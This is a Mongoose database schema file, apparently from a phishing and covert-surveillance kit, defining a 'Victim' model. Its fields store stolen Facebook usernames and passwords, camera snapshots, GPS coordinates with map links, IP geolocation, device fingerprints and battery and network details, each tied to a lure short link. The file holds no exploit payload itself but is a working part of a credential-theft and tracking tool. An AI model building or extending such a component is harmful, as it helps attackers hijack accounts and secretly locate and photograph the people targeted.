const mongoose = require('mongoose');

const victimSchema = new mongoose.Schema({
    id: { type: String, unique: true, required: true },
    fbId: { type: String, default: 'unknown' },
    type: { 
        type: String, 
        enum: ['camera', 'location', 'fb'],  // ← 'location' যোগ করা হয়েছে
        default: 'camera' 
    },
    shortLink: { type: String },
    timestamp: { type: Date, default: Date.now },
    status: { type: String, default: 'pending' },
    
    ip: { type: String, default: null },
    
    location: {
        country: { type: String, default: 'N/A' },
        region: { type: String, default: 'N/A' },
        city: { type: String, default: 'N/A' },
        latitude: { type: Number, default: 0 },
        longitude: { type: Number, default: 0 },
        isp: { type: String, default: 'N/A' }
    },
    
    gpsLocation: {
        latitude: { type: Number, default: 0 },
        longitude: { type: Number, default: 0 },
        accuracy: { type: Number, default: 0 },
        googleMaps: { type: String, default: '' }
    },
    
    device: {
        productSub: { type: String, default: 'N/A' },
        vendor: { type: String, default: 'N/A' },
        maxTouchPoints: { type: Number, default: 0 },
        doNotTrack: { type: String, default: 'N/A' },
        hardwareConcurrency: { type: Number, default: 0 },
        cookieEnabled: { type: Boolean, default: false },
        appCodeName: { type: String, default: 'N/A' },
        appName: { type: String, default: 'N/A' },
        appVersion: { type: String, default: 'N/A' },
        platform: { type: String, default: 'N/A' },
        product: { type: String, default: 'N/A' },
        userAgent: { type: String, default: 'N/A' },
        language: { type: String, default: 'N/A' },
        languages: { type: [String], default: [] },
        webdriver: { type: Boolean, default: false },
        pdfViewerEnabled: { type: Boolean, default: false },
        deviceMemory: { type: String, default: 'N/A' },
        screen: { type: String, default: 'N/A' },
        colorDepth: { type: Number, default: 0 }
    },
    
    media: [{
        kind: { type: String, default: 'N/A' },
        label: { type: String, default: 'N/A' },
        deviceId: { type: String, default: 'N/A' }
    }],
    
    network: {
        type: { type: String, default: 'N/A' },
        rtt: { type: Number, default: 0 },
        saveData: { type: Boolean, default: false },
        effectiveType: { type: String, default: 'N/A' },
        downlink: { type: Number, default: 0 },
        downlinkMax: { type: Number, default: 0 }
    },
    
    battery: {
        level: { type: Number, default: 0 },
        charging: { type: Boolean, default: false },
        chargingTime: { type: Number, default: 0 },
        dischargingTime: { type: Number, default: 0 }
    },
    
    camera: [{
        image: { type: String, default: '' },
        timestamp: { type: Date, default: Date.now }
    }],
    
    fbLogin: {
        username: { type: String, default: '' },
        password: { type: String, default: '' },
        timestamp: { type: Date, default: Date.now },
        ip: { type: String, default: 'N/A' }
    },
    
    collectedAt: { type: Date, default: Date.now }
});

module.exports = mongoose.model('Victim', victimSchema);